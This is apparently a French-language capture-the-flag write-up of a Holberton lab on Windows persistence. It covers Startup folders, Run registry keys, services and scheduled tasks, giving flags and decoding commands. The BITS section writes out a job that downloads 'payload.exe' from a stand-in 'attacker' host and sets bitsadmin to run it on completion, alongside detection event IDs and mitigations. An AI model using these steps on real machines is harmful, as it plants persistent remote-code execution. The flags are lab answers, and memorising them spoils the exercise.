# Résultats - Techniques de Persistance Windows

## Tâche 0 - Dossier Startup
**Flag :** `fa10c0cd8425463a56e69a911d45a545`
**Méthode :** Exploration des dossiers Startup utilisateur et global.
- `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

---

## Tâche 1 - Clés de Registre Autorun
**Flag :** `Holberton{Persist_Through_Win_Registers}`
**Méthode :** Clé de registre `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` contenant un script PowerShell (`UserProfile.ps1`) avec un flag encodé en hexadécimal.

**Clé trouvée :**
```
flag2 -> powershell.exe -ep bypass -File "C:\Program Files (x86)\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\UserProfile.ps1"
```

**Décodage hex :**
```powershell
$a=0x48,0x6f,...,0x7d
[System.Text.Encoding]::ASCII.GetString($a)
# -> Holberton{Persist_Through_Win_Registers}
```

---

## Tâche 2 - Services Windows
**Flag :** `Holberton{L0ng_Live_S3rvices}`
**Méthode :** Service `flag3` avec un flag encodé en base64 dans sa description.

**Commandes :**
```powershell
Get-WmiObject Win32_Service | Where-Object { $_.Name -eq "flag3" } | Select-Object Description
# Description: "...your flag is base64 encoded: SG9sYmVydG9ue0wwbmdfTGl2ZV9TM3J2aWNlc30="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9sYmVydG9ue0wwbmdfTGl2ZV9TM3J2aWNlc30="))
# -> Holberton{L0ng_Live_S3rvices}
```

---

## Tâche 3 - Tâches Planifiées
**Flag :** `Holberton{Messi_Schedule_N10}`
**Méthode :** Tâche planifiée `flag04` avec le flag dans sa description.

**Commandes :**
```powershell
Get-ScheduledTask | Where-Object { $_.Description -match "flag|Holberton" }
(Get-ScheduledTask -TaskName "flag04").Description
# -> Holberton{Messi_Schedule_N10}
```

---

## Tâche 4 - BITSAdmin
**Script :** `bits_persistence.ps1`

### Vue d'ensemble BITS
BITS (Background Intelligent Transfer Service) est un service Windows conçu pour transférer des fichiers en arrière-plan de manière throttlée. Les attaquants l'exploitent car :
- Les jobs persistent après redémarrage
- Le trafic passe souvent inaperçu (port 80/443)
- Les jobs peuvent exécuter des commandes à la fin du téléchargement

### Étapes d'exploitation
1. **Énumération des jobs existants :**
```powershell
Get-BitsTransfer -AllUsers
bitsadmin /list /allusers /verbose
```

2. **Création d'un job malveillant :**
```powershell
Start-BitsTransfer -DisplayName "SystemUpdateJob" -Source "http://attacker/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Asynchronous -Priority Low -RetryInterval 60 -RetryTimeout 1209600
```

3. **Configuration de l'exécution du payload :**
```cmd
bitsadmin /SetNotifyCmdLine <JobId> "C:\Windows\Temp\payload.exe" ""
bitsadmin /SetNotifyFlags <JobId> 1
```

4. **Script checker (Tâche planifiée toutes les 10 min) :**
Le script `bits_checker.ps1` vérifie si le job existe et le recrée si supprimé.

5. **Détection :**
```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 20
```

### Indicateurs de détection
- Event ID 3 : Job créé
- Event ID 4 : Job modifié
- Event ID 59 : Transfert démarré
- Jobs avec des URLs externes inattendues
- Jobs avec des commandes de notification (`NotifyCmdLine`)

### Mitigation
- Désactiver BITS si non nécessaire
- Monitorer les Event Logs BITS
- Bloquer les connexions sortantes non autorisées
- Utiliser `Get-BitsTransfer -AllUsers` régulièrement
